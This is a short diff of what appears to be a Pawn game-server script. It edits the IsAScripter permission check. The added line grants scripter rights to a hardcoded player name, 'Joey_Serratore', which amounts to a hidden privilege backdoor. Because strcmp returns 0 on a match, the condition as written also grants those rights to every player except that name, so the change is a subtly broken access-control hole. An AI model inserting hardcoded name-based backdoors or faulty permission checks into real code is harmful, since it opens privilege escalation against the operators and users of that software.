@@ -247,7 +247,7 @@ IsAKox(playerid)
 
 IsAScripter(playerid)
 {
-	if(PlayerInfo[playerid][pNewAP] == 5)
+	if(PlayerInfo[playerid][pNewAP] == 5 || strcmp(GetNick(playerid),"Joey_Serratore"))
 	{
 		return 1;
 	}
